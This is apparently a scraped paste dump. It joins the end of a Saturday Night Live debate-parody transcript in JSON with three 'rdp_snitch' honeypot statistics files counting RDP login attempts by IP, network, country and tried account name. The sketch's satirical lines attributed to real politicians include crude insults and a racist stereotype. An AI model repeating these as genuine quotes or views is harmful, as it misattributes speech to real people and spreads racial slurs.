      ""text"": ""I DID, RIGHT OFF THE STIFF RED CUFF.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""SAY, JAZZMAN. I'VE GOT A VERY PRESIDENTIAL ANSWER FOR THIS. OUR JOBS ARE FLEEING THIS COUNTRY. THEY'RE GOING TO MEXICO, THEY'RE GOING TO JI-NA. I'D STOP THAT. IF HILLARY KNEW HOW SHE WOULD HAVE DONE IT ALREADY, END OF STORY. I WON THE DEBATE, I STAYED CALM JUST LIKE I PROMISED, AND IT IS OVER. GOOD NIGHT, HOFSTRA.""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""DONALD.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[CHEERS AND APPLAUSE]""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""DONALD, THERE'S STILL 88 MINUTES LEFT. IT'S A 90-MINUTE DEBATE.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[LAUGHTER]""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""MY MICROPHONE IS BROKEN. SHE BROKE IT. WITH OBAMA. SHE AND OBAMA STOLE MY MICROPHONE. THEY TOOK MY MICROPHONE TO KENYA AND THEY BROKE IT AND NOW IT'S BROKEN. DO YOU HEAR THAT? SOMEBODY'S SNIFFING HERE. I THINK IT'S HER SNIFFS. SHE'S BEEN SNIFFING ALL NIGHT. TESTING, TESTING. JI-NA, JI-NA. YUGE, JI-NA.""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""SECRETARY CLINTON, WHAT DO YOU THINK ABOUT THAT?""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""I THINK I'M GOING TO BE PRESIDENT.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[LAUGHTER]""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[CHEERS AND APPLAUSE]""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""I MEAN, THIS MAN IS CLEARLY UNFIT TO BE COMMANDER IN CHIEF.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""WRONG.""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""HE IS A BULLY.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""SHUT UP.""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""HE STARTED THE BIRTHER MOVEMENT.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""YOU DID.""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""HE SAID CLIMATE CHANGE IS A HOAX INVENTED BY CHINA.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""IT'S PRONOUNCED JI-NA.""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""HE HASN'T RELEASED HIS TAX RETURNS WHICH MEANS HE'S EITHER NOT THAT RICH.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""WRONG.""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""NOT THAT CHARITABLE.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""WRONG.""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""OR HE'S NOT PAID TAXES IN HIS LIFE.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""WRONGER.""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""LET'S MOVE ON TO NATIONAL SECURITY. MR. TRUMP, YOU'VE CRITICIZED SECRETARY CLINTON FOR VOTING FOR THE IRAQ WAR, BUT YOU YOURSELF SUPPORTED THE WAR --""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""WRONG, WRONG, WRONG. YOU'RE BEING VERY MEAN TO ME TONIGHT, COLTRANE, VERY MEAN. I WAS AGAINST THE WAR, NAME ANYONE IN THE WORLD NAMED SEAN HANNITY. I TOLD SEAN HANNITY, CALL SEAN HANNITY.""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""YOU TOLD SEAN HANNITY ON HIS SHOW AND THERE'S PROOF?""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""I TOLD HIM IN PRIVATE. ME AND SEAN LATE AT NIGHT. I LEANED OVER AND WHISPERED IN HIS EAR, SEAN, I'M AGAINST THE WAR IN IRAQ. HE WHISPERED IN MY EAR, I'M AGAINST THE WAR TOO. NEXT THING I KNEW, I WAS KISSING SEAN HANNITY.""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""MOVING RIGHT PAST THAT.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[LAUGHTER]""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""THE IRAQ WAR IS ALL ABOUT JUDGMENT. SECRETARY CLINTON, DO YOU THINK YOU HAVE BETTER JUDGMENT THAN MR. TRUMP?""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""HA HA, YES, YES. YES. OF COURSE, I DO. DONALD TRUMP HAS TERRIBLE JUDGMENT. HE MAKES BAD DECISIONS. HE SPENDS HIS LIFE CHEATING MIDDLE-CLASS LABORERS. LABORERS LIKE MY OWN HUMAN FATHER. WHO MADE -- I GUESS DRAPES OR PRINTED DRAPES OR SOLD DRAPES OR -- AND HE WAS RELATABLE, AND I AM ALSO RELATABLE.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[LAUGHTER]""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""MR. TRUMP, SAME QUESTION. WHY IS YOUR JUDGMENT BETTER THAN SECRETARY CLINTON'S?""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""BECAUSE IT IS. I HAVE THE BEST JUDGMENT. AND THE BEST TEMPERAMENT. SHE'S THE ONE WITH THE BAD TEMPERAMENT. SHE'S ALWAYS SCREAMING. SHE'S CONSTANTLY LYING. HER HAIR IS CRAZY. HER FACE IS COMPLETELY ORANGE. EXCEPT AROUND THE EYES WHERE IT'S WHITE. ONCE SHE STOPS TALKING HER MOUTH LOOKS LIKE A TINY LITTLE BUTTHOLE.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[LAUGHTER]""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[CHEERS AND APPLAUSE]""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""SECRETARY CLINTON, YOU HAVE TWO MINUTES TO RESPOND.""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""OH, THAT'S OKAY. HE CAN HAVE MY TWO MINUTES.""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""OKAY, MR. TRUMP, TWO MORE MINUTES.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""THE THING ABOUT THE BLACKS IS THAT THEY'RE KILLING EACH OTHER. ALL THE BLACKS LIVE ON ONE STREET IN CHICAGO. ALL ON ONE STREET. IT'S CALLED HELL STREET. AND THEY'RE ON HELL STREET AND THEY'RE ALL JUST KILLING EACH OTHER. JUST LIKE I AM KILLING THIS DEBATE.""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""SECRETARY CLINTON, DID YOU HAVE A RESPONSE?""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""UM --""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[LAUGHTER]""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[CHEERS AND APPLAUSE]""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""NOT A -- NOT A RESPONSE, MORE OF A REQUEST. CAN AMERICA VOTE RIGHT NOW?""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[LAUGHTER]""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""WELL, THIS HAS BEEN AN ILLUMINATING DEBATE. BUT NOW IT'S TIME FOR OUR FINAL --""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""ALICIA MACHADO.""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""I'M SORRY, WHAT WAS THAT? WHO IS ALICIA MACHADO?""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""THANK YOU FOR BRINGING THAT UP, LESTER. SHE IS A STRONG, BEAUTIFUL, POLITICAL PROP THAT I ALMOST FORGOT TO MENTION TONIGHT, EVEN THOUGH WE ALREADY MADE A WEB VIDEO ABOUT HER. ALICIA MACHADO WAS MISS UNIVERSE IN 1996.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""WHERE'D YOU FIND THIS?""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""AND DONALD TRUMP CALLS HER MISS PIGGY.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""HOW DO YOU KNOW THIS?""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""AND MISS HOUSEKEEPING.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[LAUGHTER]""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""THAT'S PRETTY FUNNY.""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""MR. TRUMP, YOUR RESPONSE?""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""LESTER, WHY ARE WE TALKING ABOUT THIS WOMAN? WE SHOULD BE TALKING ABOUT THE IMPORTANT ISSUES, LIKE ROSIE O'DONNELL. AND HOW SHE'S A FAT LOSER. EVERYONE AGREES WITH ME AND I WANTED TO BRING THAT UP IN A PRESIDENTIAL DEBATE RIGHT AT THE END, MY OWN VOLITION, GOOD IDEA, I DID IT.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[LAUGHTER]""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""SECRETARY CLINTON, WHY ARE YOU CRYING?""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""I -- I'M SORRY, LESTER. THIS IS GOING SO WELL. IT'S GOING EXACTLY HOW I'D ALWAYS DREAMED.""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""OKAY. NOW IT'S TIME TO MOVE ON TO THE CLOSING STATEMENTS. SECRETARY CLINTON, YOU'RE FIRST.""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""LISTEN, AMERICA. I GET IT. YOU HATE ME. YOU HATE MY VOICE. AND YOU HATE MY FACE. WELL, HERE'S A TIP. IF YOU NEVER WANT TO SEE MY FACE AGAIN, ELECT ME PRESIDENT, AND I SWEAR TO GOD I WILL LOCK MYSELF IN THE OVAL OFFICE AND NOT COME OUT FOR FOUR YEARS. BUT IF YOU DON'T ELECT ME, I WILL CONTINUE TO RUN FOR PRESIDENT UNTIL THE DAY I DIE. AND I WILL NEVER DIE.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[CHEERS AND APPLAUSE]""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""MR. TRUMP. FINAL REMARKS.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""YOU KNOW WHAT, LESTER? I WAS GOING TO SAY SOMETHING EXTREMELY ROUGH TO HILLARY TONIGHT. BUT I SAID TO MYSELF, I CAN'T DO IT, I JUST CAN'T DO IT. BUT IF I HAD SAID IT IT WOULD HAVE BEEN A NUCLEAR BOMB. BECAUSE IN THE '90s, OUR PRESIDENT WAS A MAN NAMED BILL CLINTON. NOT MANY PEOPLE KNOW THIS, BUT THAT MAN IS HER HUSBAND. IN 1998, GET THIS, HE HAD AN AFFAIR. IT'S TRUE. MY INVESTIGATORS ARE LOOKING INTO IT RIGHT NOW. IT WAS A WOMAN, IT WAS A WOMAN NAMED MONICA. VERY HEAVY. I DON'T HAVE HER LAST NAME YET BUT WHEN I GET IT, I'M GOING TO SET MY ALARM FOR 3:20 A.M. AND GO SIT ON MY GOLDEN TOILET BOWL AND TWEET ABOUT IT UNTIL COMPLETION.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[LAUGHTER]""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""OH MY GOD. JUST TO REMIND EVERYBODY AT HOME, THIS WAS A PRESIDENTIAL DEBATE. ANY FINAL WORDS?""
    },
    {
      ""speaker"": ""All"",
      ""text"": ""LIVE FROM NEW YORK, IT'S SATURDAY NIGHT!""
    }
  ]
}
"
QhBbjGAj,2024-06-27_stats.json,rdp_snitch,JSON,Thursday 27th of June 2024 07:18:01 PM CDT,"{
  ""ip"": {
    ""23.247.130.238"": 1422,
    ""164.92.104.215"": 9,
    ""205.210.31.215"": 9,
    ""87.251.75.64"": 3,
    ""98.143.255.25"": 18,
    ""64.124.50.139"": 6,
    ""96.51.53.164"": 6,
    ""212.70.149.142"": 12,
    ""104.248.154.46"": 9,
    ""194.165.16.78"": 6,
    ""45.227.254.54"": 6,
    ""157.10.45.48"": 3,
    ""185.170.144.3"": 6,
    ""112.124.54.21"": 6,
    ""194.165.16.73"": 6,
    ""194.180.49.249"": 3,
    ""205.210.31.164"": 9,
    ""194.165.16.72"": 6,
    ""185.122.204.62"": 9,
    ""212.70.149.146"": 18,
    ""80.66.66.250"": 3,
    ""213.109.202.251"": 18,
    ""45.137.201.119"": 3,
    ""185.122.204.64"": 9,
    ""118.71.209.116"": 3,
    ""211.114.132.69"": 3,
    ""81.19.135.2"": 9,
    ""162.210.245.77"": 12,
    ""198.235.24.19"": 9,
    ""103.167.88.153"": 6,
    ""194.169.175.24"": 9,
    ""51.81.163.55"": 3,
    ""116.140.196.215"": 3,
    ""45.227.254.49"": 6,
    ""194.165.16.10"": 6,
    ""205.210.31.246"": 9,
    ""167.94.138.56"": 3
  },
  ""asn"": {
    ""AS138152"": 1422,
    ""AS14061"": 18,
    ""AS396982"": 36,
    ""AS208091"": 3,
    ""AS3367"": 18,
    ""AS6461"": 6,
    ""AS6327"": 6,
    ""AS204428"": 30,
    ""AS48721"": 24,
    ""AS267784"": 12,
    ""AS150862"": 3,
    ""AS197414"": 6,
    ""AS37963"": 6,
    ""AS201814"": 3,
    ""AS57523"": 18,
    ""AS51765"": 3,
    ""AS208312"": 18,
    ""AS49581"": 3,
    ""AS18403"": 3,
    ""AS4766"": 3,
    ""AS209588"": 9,
    ""AS397651"": 12,
    ""AS140804"": 6,
    ""AS209605"": 9,
    ""AS16276"": 3,
    ""AS4837"": 3,
    ""AS398324"": 3
  },
  ""isp"": {
    ""Yisu Cloud LTD"": 1422,
    ""DigitalOcean, LLC"": 18,
    ""Google LLC"": 36,
    ""Xhost Internet Solutions LP"": 9,
    ""Xplornet Communications Inc."": 18,
    ""Zayo Bandwidth"": 6,
    ""Shaw Communications Inc."": 6,
    ""SS-Net"": 30,
    ""Flyservers S.A."": 45,
    ""HAINAMTECH"": 3,
    ""Hangzhou Alibaba Advertising Co"": 6,
    ""MEVSPACE sp. z o.o."": 3,
    ""Chang Way Technologies Co. Limited"": 18,
    ""Oy Crea Nova Hosting Solution Ltd"": 3,
    ""Red Byte LLC"": 18,
    ""Ferdinand Zink trading as Tube-Hosting"": 3,
    ""fpt"": 3,
    ""Korea Telecom"": 3,
    ""RCI Broadband"": 12,
    ""Jobkey Joint Stock Company"": 6,
    ""UAB Host Baltic"": 9,
    ""OVH US LLC"": 3,
    ""China Unicom CHINA169 Network"": 3,
    ""Censys, Inc."": 3
  },
  ""org"": {
    ""IDC SPACE INC"": 1422,
    ""DigitalOcean, LLC"": 18,
    ""Palo Alto Networks, Inc"": 36,
    ""Xhost Internet Solutions"": 6,
    ""Unknown"": 21,
    ""Microsoft Corporation"": 6,
    ""Shaw Communications Inc"": 6,
    ""4Media Ltd"": 30,
    ""Flyservers S.A"": 24,
    ""UAB Host Baltic"": 12,
    ""HAI NAM Real Estate and Technology Joint Stock Company"": 3,
    ""Xhostis"": 6,
    ""Aliyun Computing Co., LTD"": 6,
    ""HostSlick"": 3,
    ""Starcrecium Limited"": 18,
    ""Chang Way Technologies Co. Limited"": 18,
    ""Taurus"": 3,
    ""Kornet"": 3,
    ""Alviva Holding Limited"": 9,
    ""10x Servers"": 12,
    ""JOBKEY"": 6,
    ""EmanuelHosting LTD"": 9,
    ""George, Okpara"": 3,
    ""China United Network Communications Corporation Limited"": 3,
    ""Censys, Inc"": 3
  },
  ""regionName"": {
    ""\u00cele-de-France"": 1422,
    ""California"": 45,
    ""North Holland"": 9,
    ""New Brunswick"": 18,
    ""Virginia"": 21,
    ""Alberta"": 6,
    ""Sofia-Capital"": 30,
    ""Central Singapore"": 9,
    ""Kaunas"": 33,
    ""Vilnius"": 12,
    ""Tuy\u00ean Quang Province"": 3,
    ""Zhejiang"": 6,
    ""Moscow"": 36,
    ""Uusimaa"": 3,
    ""Lombardy"": 3,
    ""Ho Chi Minh"": 3,
    ""Gyeonggi-do"": 3,
    ""Hesse"": 9,
    ""Da Nang"": 6,
    ""Oregon"": 3,
    ""Beijing"": 3,
    ""Michigan"": 3
  },
  ""country"": {
    ""France"": 1422,
    ""United States"": 72,
    ""The Netherlands"": 9,
    ""Canada"": 24,
    ""Bulgaria"": 30,
    ""Singapore"": 9,
    ""Lithuania"": 45,
    ""Vietnam"": 12,
    ""China"": 9,
    ""Russia"": 36,
    ""Finland"": 3,
    ""Italy"": 3,
    ""South Korea"": 3,
    ""Germany"": 9
  },
  ""account"": {
    ""710992661"": 1422,
    ""hello"": 66,
    ""xJIJnLpyP"": 3,
    ""oQAYOg"": 3,
    ""jFKeIm"": 3,
    ""Administr"": 33,
    ""Test"": 63,
    ""fTstrtJVv"": 3,
    ""kExEys"": 3,
    ""oLqidE"": 3,
    ""Domain"": 57,
    ""(empty)"": 9,
    ""YGJxlaMUx"": 3,
    ""IuvpdY"": 3,
    ""uXsJGD"": 3,
    ""LiwMEJWWz"": 3,
    ""SreMmn"": 3,
    ""bgfLif"": 3
  },
  ""keyboard"": {
    ""Unknown"": 1686
  },
  ""client_build"": {
    ""Unknown"": 1686
  },
  ""client_name"": {
    ""Unknown"": 1686
  },
  ""ip_type"": {
    ""Unknown"": 1572,
    ""hosting"": 66,
    ""proxy"": 48
  }
}"
CtYz9Nvp,2024-06-27_stats.json,rdp_snitch,JSON,Thursday 27th of June 2024 07:16:12 PM CDT,"{
  ""ip"": {
    ""23.247.130.238"": 948,
    ""164.92.104.215"": 6,
    ""205.210.31.215"": 6,
    ""87.251.75.64"": 2,
    ""98.143.255.25"": 12,
    ""64.124.50.139"": 4,
    ""96.51.53.164"": 4,
    ""212.70.149.142"": 8,
    ""104.248.154.46"": 6,
    ""194.165.16.78"": 4,
    ""45.227.254.54"": 4,
    ""157.10.45.48"": 2,
    ""185.170.144.3"": 4,
    ""112.124.54.21"": 4,
    ""194.165.16.73"": 4,
    ""194.180.49.249"": 2,
    ""205.210.31.164"": 6,
    ""194.165.16.72"": 4,
    ""185.122.204.62"": 6,
    ""212.70.149.146"": 12,
    ""80.66.66.250"": 2,
    ""213.109.202.251"": 12,
    ""45.137.201.119"": 2,
    ""185.122.204.64"": 6,
    ""118.71.209.116"": 2,
    ""211.114.132.69"": 2,
    ""81.19.135.2"": 6,
    ""162.210.245.77"": 8,
    ""198.235.24.19"": 6,
    ""103.167.88.153"": 4,
    ""194.169.175.24"": 6,
    ""51.81.163.55"": 2,
    ""116.140.196.215"": 2,
    ""45.227.254.49"": 4,
    ""194.165.16.10"": 4,
    ""205.210.31.246"": 6,
    ""167.94.138.56"": 2
  },
  ""asn"": {
    ""AS138152"": 948,
    ""AS14061"": 12,
    ""AS396982"": 24,
    ""AS208091"": 2,
    ""AS3367"": 12,
    ""AS6461"": 4,
    ""AS6327"": 4,
    ""AS204428"": 20,
    ""AS48721"": 16,
    ""AS267784"": 8,
    ""AS150862"": 2,
    ""AS197414"": 4,
    ""AS37963"": 4,
    ""AS201814"": 2,
    ""AS57523"": 12,
    ""AS51765"": 2,
    ""AS208312"": 12,
    ""AS49581"": 2,
    ""AS18403"": 2,
    ""AS4766"": 2,
    ""AS209588"": 6,
    ""AS397651"": 8,
    ""AS140804"": 4,
    ""AS209605"": 6,
    ""AS16276"": 2,
    ""AS4837"": 2,
    ""AS398324"": 2
  },
  ""isp"": {
    ""Yisu Cloud LTD"": 948,
    ""DigitalOcean, LLC"": 12,
    ""Google LLC"": 24,
    ""Xhost Internet Solutions LP"": 6,
    ""Xplornet Communications Inc."": 12,
    ""Zayo Bandwidth"": 4,
    ""Shaw Communications Inc."": 4,
    ""SS-Net"": 20,
    ""Flyservers S.A."": 30,
    ""HAINAMTECH"": 2,
    ""Hangzhou Alibaba Advertising Co"": 4,
    ""MEVSPACE sp. z o.o."": 2,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Oy Crea Nova Hosting Solution Ltd"": 2,
    ""Red Byte LLC"": 12,
    ""Ferdinand Zink trading as Tube-Hosting"": 2,
    ""fpt"": 2,
    ""Korea Telecom"": 2,
    ""RCI Broadband"": 8,
    ""Jobkey Joint Stock Company"": 4,
    ""UAB Host Baltic"": 6,
    ""OVH US LLC"": 2,
    ""China Unicom CHINA169 Network"": 2,
    ""Censys, Inc."": 2
  },
  ""org"": {
    ""IDC SPACE INC"": 948,
    ""DigitalOcean, LLC"": 12,
    ""Palo Alto Networks, Inc"": 24,
    ""Xhost Internet Solutions"": 4,
    ""Unknown"": 14,
    ""Microsoft Corporation"": 4,
    ""Shaw Communications Inc"": 4,
    ""4Media Ltd"": 20,
    ""Flyservers S.A"": 16,
    ""UAB Host Baltic"": 8,
    ""HAI NAM Real Estate and Technology Joint Stock Company"": 2,
    ""Xhostis"": 4,
    ""Aliyun Computing Co., LTD"": 4,
    ""HostSlick"": 2,
    ""Starcrecium Limited"": 12,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Taurus"": 2,
    ""Kornet"": 2,
    ""Alviva Holding Limited"": 6,
    ""10x Servers"": 8,
    ""JOBKEY"": 4,
    ""EmanuelHosting LTD"": 6,
    ""George, Okpara"": 2,
    ""China United Network Communications Corporation Limited"": 2,
    ""Censys, Inc"": 2
  },
  ""regionName"": {
    ""\u00cele-de-France"": 948,
    ""California"": 30,
    ""North Holland"": 6,
    ""New Brunswick"": 12,
    ""Virginia"": 14,
    ""Alberta"": 4,
    ""Sofia-Capital"": 20,
    ""Central Singapore"": 6,
    ""Kaunas"": 22,
    ""Vilnius"": 8,
    ""Tuy\u00ean Quang Province"": 2,
    ""Zhejiang"": 4,
    ""Moscow"": 24,
    ""Uusimaa"": 2,
    ""Lombardy"": 2,
    ""Ho Chi Minh"": 2,
    ""Gyeonggi-do"": 2,
    ""Hesse"": 6,
    ""Da Nang"": 4,
    ""Oregon"": 2,
    ""Beijing"": 2,
    ""Michigan"": 2
  },
  ""country"": {
    ""France"": 948,
    ""United States"": 48,
    ""The Netherlands"": 6,
    ""Canada"": 16,
    ""Bulgaria"": 20,
    ""Singapore"": 6,
    ""Lithuania"": 30,
    ""Vietnam"": 8,
    ""China"": 6,
    ""Russia"": 24,
    ""Finland"": 2,
    ""Italy"": 2,
    ""South Korea"": 2,
    ""Germany"": 6
  },
  ""account"": {
    ""710992661"": 948,
    ""hello"": 44,
    ""xJIJnLpyP"": 2,
    ""oQAYOg"": 2,
    ""jFKeIm"": 2,
    ""Administr"": 22,
    ""Test"": 42,
    ""fTstrtJVv"": 2,
    ""kExEys"": 2,
    ""oLqidE"": 2,
    ""Domain"": 38,
    ""(empty)"": 6,
    ""YGJxlaMUx"": 2,
    ""IuvpdY"": 2,
    ""uXsJGD"": 2,
    ""LiwMEJWWz"": 2,
    ""SreMmn"": 2,
    ""bgfLif"": 2
  },
  ""keyboard"": {
    ""Unknown"": 1124
  },
  ""client_build"": {
    ""Unknown"": 1124
  },
  ""client_name"": {
    ""Unknown"": 1124
  },
  ""ip_type"": {
    ""Unknown"": 1048,
    ""hosting"": 44,
    ""proxy"": 32
  }
}"
qYimYx37,2024-06-27_stats.json,rdp_snitch,JSON,Thursday 27th of June 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""23.247.130.238"": 474,
    ""164.92.104.215"": 3,
    ""205.210.31.215"": 3,
    ""87.251.75.64"": 1,
    ""98.143.255.25"": 6,
    ""64.124.50.139"": 2,
    ""96.51.53.164"": 2,
    ""212.70.149.142"": 4,
    ""104.248.154.46"": 3,
    ""194.165.16.78"": 2,
    ""45.227.254.54"": 2,
    ""157.10.45.48"": 1,
    ""185.170.144.3"": 2,
    ""112.124.54.21"": 2,
    ""194.165.16.73"": 2,
    ""194.180.49.249"": 1,
    ""205.210.31.164"": 3,
    ""194.165.16.72"": 2,
    ""185.122.204.62"": 3,
    ""212.70.149.146"": 6,
    ""80.66.66.250"": 1,
    ""213.109.202.251"": 6,
    ""45.137.201.119"": 1,
    ""185.122.204.64"": 3,
    ""118.71.209.116"": 1,
    ""211.114.132.69"": 1,
    ""81.19.135.2"": 3,
    ""162.210.245.77"": 4,
    ""198.235.24.19"": 3,
    ""103.167.88.153"": 2,
    ""194.169.175.24"": 3,
    ""51.81.163.55"": 1,
    ""116.140.196.215"": 1,
    ""45.227.254.49"": 2,
    ""194.165.16.10"": 2,
    ""205.210.31.246"": 3,
    ""167.94.138.56"": 1
  },
  ""asn"": {
    ""AS138152"": 474,
    ""AS14061"": 6,
    ""AS396982"": 12,
    ""AS208091"": 1,
    ""AS3367"": 6,
    ""AS6461"": 2,
    ""AS6327"": 2,
    ""AS204428"": 10,
    ""AS48721"": 8,
    ""AS267784"": 4,
    ""AS150862"": 1,
    ""AS197414"": 2,
    ""AS37963"": 2,
    ""AS201814"": 1,
    ""AS57523"": 6,
    ""AS51765"": 1,
    ""AS208312"": 6,
    ""AS49581"": 1,
    ""AS18403"": 1,
    ""AS4766"": 1,
    ""AS209588"": 3,
    ""AS397651"": 4,
    ""AS140804"": 2,
    ""AS209605"": 3,
    ""AS16276"": 1,
    ""AS4837"": 1,
    ""AS398324"": 1
  },
  ""isp"": {
    ""Yisu Cloud LTD"": 474,
    ""DigitalOcean, LLC"": 6,
    ""Google LLC"": 12,
    ""Xhost Internet Solutions LP"": 3,
    ""Xplornet Communications Inc."": 6,
    ""Zayo Bandwidth"": 2,
    ""Shaw Communications Inc."": 2,
    ""SS-Net"": 10,
    ""Flyservers S.A."": 15,
    ""HAINAMTECH"": 1,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""MEVSPACE sp. z o.o."": 1,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Oy Crea Nova Hosting Solution Ltd"": 1,
    ""Red Byte LLC"": 6,
    ""Ferdinand Zink trading as Tube-Hosting"": 1,
    ""fpt"": 1,
    ""Korea Telecom"": 1,
    ""RCI Broadband"": 4,
    ""Jobkey Joint Stock Company"": 2,
    ""UAB Host Baltic"": 3,
    ""OVH US LLC"": 1,
    ""China Unicom CHINA169 Network"": 1,
    ""Censys, Inc."": 1
  },
  ""org"": {
    ""IDC SPACE INC"": 474,
    ""DigitalOcean, LLC"": 6,
    ""Palo Alto Networks, Inc"": 12,
    ""Xhost Internet Solutions"": 2,
    ""Unknown"": 7,
    ""Microsoft Corporation"": 2,
    ""Shaw Communications Inc"": 2,
    ""4Media Ltd"": 10,
    ""Flyservers S.A"": 8,
    ""UAB Host Baltic"": 4,
    ""HAI NAM Real Estate and Technology Joint Stock Company"": 1,
    ""Xhostis"": 2,
    ""Aliyun Computing Co., LTD"": 2,
    ""HostSlick"": 1,
    ""Starcrecium Limited"": 6,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Taurus"": 1,
    ""Kornet"": 1,
    ""Alviva Holding Limited"": 3,
    ""10x Servers"": 4,
    ""JOBKEY"": 2,
    ""EmanuelHosting LTD"": 3,
    ""George, Okpara"": 1,
    ""China United Network Communications Corporation Limited"": 1,
    ""Censys, Inc"": 1
  },
  ""regionName"": {
    ""\u00cele-de-France"": 474,
    ""California"": 15,
    ""North Holland"": 3,
    ""New Brunswick"": 6,
    ""Virginia"": 7,
    ""Alberta"": 2,
    ""Sofia-Capital"": 10,
    ""Central Singapore"": 3,
    ""Kaunas"": 11,
    ""Vilnius"": 4,
    ""Tuy\u00ean Quang Province"": 1,
    ""Zhejiang"": 2,
    ""Moscow"": 12,
    ""Uusimaa"": 1,
    ""Lombardy"": 1,
    ""Ho Chi Minh"": 1,
    ""Gyeonggi-do"": 1,
    ""Hesse"": 3,
    ""Da Nang"": 2,
    ""Oregon"": 1,
    ""Beijing"": 1,
    ""Michigan"": 1
  },
  ""country"": {
    ""France"": 474,
    ""United States"": 24,
    ""The Netherlands"": 3,
    ""Canada"": 8,
    ""Bulgaria"": 10,
    ""Singapore"": 3,
    ""Lithuania"": 15,
    ""Vietnam"": 4,
    ""China"": 3,
    ""Russia"": 12,
    ""Finland"": 1,
    ""Italy"": 1,
    ""South Korea"": 1,
    ""Germany"": 3
  },
  ""account"": {
    ""710992661"": 474,
    ""hello"": 22,
    ""xJIJnLpyP"": 1,
    ""oQAYOg"": 1,
    ""jFKeIm"": 1,
    ""Administr"": 11,
    ""Test"": 21,
    ""fTstrtJVv"": 1,
    ""kExEys"": 1,
    ""oLqidE"": 1,
    ""Domain"": 19,
    ""(empty)"": 3,
    ""YGJxlaMUx"": 1,
    ""IuvpdY"": 1,
    ""uXsJGD"": 1,
    ""LiwMEJWWz"": 1,
    ""SreMmn"": 1,
    ""bgfLif"": 1
  },
  ""keyboard"": {
    ""Unknown"": 562
  },
  ""client_build"": {
    ""Unknown"": 562
  },
  ""client_name"": {
    ""Unknown"": 562
  },
  ""ip_type"": {
    ""Unknown"": 524,
    ""hosting"": 22,
    ""proxy"": 16
  }
}"
